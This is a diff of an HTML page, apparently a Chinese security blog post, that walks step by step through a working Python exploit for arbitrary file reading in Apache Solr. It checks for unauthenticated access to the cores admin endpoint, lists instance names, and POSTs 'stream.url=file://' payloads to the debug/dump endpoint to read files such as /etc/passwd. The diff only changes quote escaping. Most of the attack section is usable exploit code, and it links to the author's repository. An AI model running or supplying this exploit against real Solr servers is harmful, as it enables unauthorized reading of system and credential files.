@@ -88,73 +88,73 @@
 <h3 id="第一步">第一步<a href="#第一步" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <p>判断输入参数是否合适。</p>
 <pre tabindex="0"><code>def PfError():
-	print('usage: solr_readfile.py ip port path')
-	print('e.g  : solr_readfile.py 127.0.0.1 8983 /etc/passwd')
+	print(&#39;usage: solr_readfile.py ip port path&#39;)
+	print(&#39;e.g  : solr_readfile.py 127.0.0.1 8983 /etc/passwd&#39;)
 	exit()
 
-if __name__ == '__main__':
+if __name__ == &#39;__main__&#39;:
 	if len(sys.argv) != 4:
 		PfError()
 </code></pre><h3 id="第二步">第二步<a href="#第二步" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <p>在Solr中，可通过访问<code>/solr/admin/cores?indexInfo=false&amp;wt=json</code>路径，获取一个包含了实例名称的json文件，但是如果不存在未授权访问，访问该url则会提示<code>401</code>，我们可以利用这一点来进行第二步的判断。</p>
 <pre tabindex="0"><code>def CheckUnauthorized(ip,port):
-	url = 'http://' + ip + ':' + port + '/solr/admin/cores?indexInfo=false&amp;wt=json'
-	headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0'}
+	url = &#39;http://&#39; + ip + &#39;:&#39; + port + &#39;/solr/admin/cores?indexInfo=false&amp;wt=json&#39;
+	headers = {&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&#39;}
 	response = requests.get(url, headers=headers)
 	if response.status_code !=200:
-		print('Not have this vulnerability...')
+		print(&#39;Not have this vulnerability...&#39;)
 		exit()
 </code></pre><h3 id="第三步">第三步<a href="#第三步" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <p>由于第二步的请求可复用，所以我们将函数修改一下，当存在未授权访问，就直接将响应的<code>json</code>文件加载为字典，从<code>status</code>中的读取<code>key</code>，就是实例名称了，由于可能会存在多个实例，所以这里使用了循环来统计输出。</p>
 <pre tabindex="0"><code>def GetInstancelist(ip,port):
-	url = 'http://' + ip + ':' + port + '/solr/admin/cores?indexInfo=false&amp;wt=json'
-	headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0'}
+	url = &#39;http://&#39; + ip + &#39;:&#39; + port + &#39;/solr/admin/cores?indexInfo=false&amp;wt=json&#39;
+	headers = {&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&#39;}
 	response = requests.get(url, headers=headers)
 	if response.status_code !=200:
-		print('Not have this vulnerability...')
+		print(&#39;Not have this vulnerability...&#39;)
 		exit()
 	instancelist = []
-	for i in json.loads(response.text)['status'].keys():
+	for i in json.loads(response.text)[&#39;status&#39;].keys():
 		instancelist.append(i)
 	return instancelist
 </code></pre><h3 id="第四步">第四步<a href="#第四步" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <p>由以上三步，我们已经获取了漏洞触发的所有必要参数。首先是漏洞请求链接：<code>http://+ip:port+/solr/+instancedir+/debug/dump?param=ContentStreams</code>，POST请求内容是：<code>stream.url=file://+filepath</code>。</p>
 <pre tabindex="0"><code>def ReadFile(instancelist,filepath):
-	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0',
-	'Content-Type': 'application/x-www-form-urlencoded'}
-	data = 'stream.url=file://'+ filepath
+	headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&#39;,
+	&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;}
+	data = &#39;stream.url=file://&#39;+ filepath
 	for instancedir in instancelist:
-		url = 'http://' + ip + ':' + port + '/solr/' + instancedir + '/debug/dump?param=ContentStreams'
+		url = &#39;http://&#39; + ip + &#39;:&#39; + port + &#39;/solr/&#39; + instancedir + &#39;/debug/dump?param=ContentStreams&#39;
 		response = requests.post(url,headers=headers,data=data)
 		if response.status_code != 200:
-			print('\n[-] This url not have vulnerability: ' + url)
+			print(&#39;\n[-] This url not have vulnerability: &#39; + url)
 			continue
-		print('\n[+] This url have vulnerability: ' + url)
+		print(&#39;\n[+] This url have vulnerability: &#39; + url)
 </code></pre><h3 id="第五步">第五步<a href="#第五步" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <p>因为版本不同，存在不一样的响应格式，目前发现的响应格式存在两种<code>json</code>、<code>xml</code></p>
 <pre tabindex="0"><code>def PfFile(r,path):
-	flag = r.headers['Content-Type']
+	flag = r.headers[&#39;Content-Type&#39;]
 	# 响应类型为json格式，采用此处提取响应内容
-	if 'json' in flag:
+	if &#39;json&#39; in flag:
 		try:
-			result = json.loads(r.text)['streams'][0]['stream']
+			result = json.loads(r.text)[&#39;streams&#39;][0][&#39;stream&#39;]
 		except e:
-			print('[+] Something is error…… Please contact author increase!')
-		print('\n[+] Lucky! filepath:'+path+'\n')
+			print(&#39;[+] Something is error…… Please contact author increase!&#39;)
+		print(&#39;\n[+] Lucky! filepath:&#39;+path+&#39;\n&#39;)
 		print(result)
 	# 响应类型为xml格式，采用此处提取响应内容
-	elif 'xml' in flag:
+	elif &#39;xml&#39; in flag:
 		DomTree = xml.dom.minidom.parseString(r.text)
 		try:
-			result = DomTree.documentElement.getElementsByTagName('str')[8].firstChild.data
+			result = DomTree.documentElement.getElementsByTagName(&#39;str&#39;)[8].firstChild.data
 		except e:
-			print('[+] Something is error…… Please contact author increase!')
-		print('\n[+] Lucky! filepath:'+path+'\n')
+			print(&#39;[+] Something is error…… Please contact author increase!&#39;)
+		print(&#39;\n[+] Lucky! filepath:&#39;+path+&#39;\n&#39;)
 		print(result)
 	# 其他的响应格式由此处输出，如果存在的话。
 	else:
-		print('[+] Find a new type! Please contact author increase!\n'+r.text)
-	print('[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]')
+		print(&#39;[+] Find a new type! Please contact author increase!\n&#39;+r.text)
+	print(&#39;[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]&#39;)
 </code></pre><h2 id="成功截图">成功截图<a href="#成功截图" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
 <p><img src="/Apache-Solr_images/4363814090360.png" alt=""></p>
 <p><code>solr_readfile.py</code>的<a href="https://github.com/a1eex0/Utilities/tree/main/Solr/solr%20Arbitrary%20file%20reading">github地址</a></p>
@@ -168,7 +168,7 @@ if __name__ == '__main__':
 
 
 
-	<script src="https://www.a1ee.cn/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js" integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin="anonymous"></script>
+	<script src="https://www.a1ee.cn/js/bundle.min.8256b8724b9578bbdf6d6f04c894255bc760e78e8a2d60ec0a91ea993acd3b77.js" integrity="sha256-gla4ckuVeLvfbW8EyJQlW8dg546KLWDsCpHqmTrNO3c=" crossorigin="anonymous"></script>
 	
 
 </body>
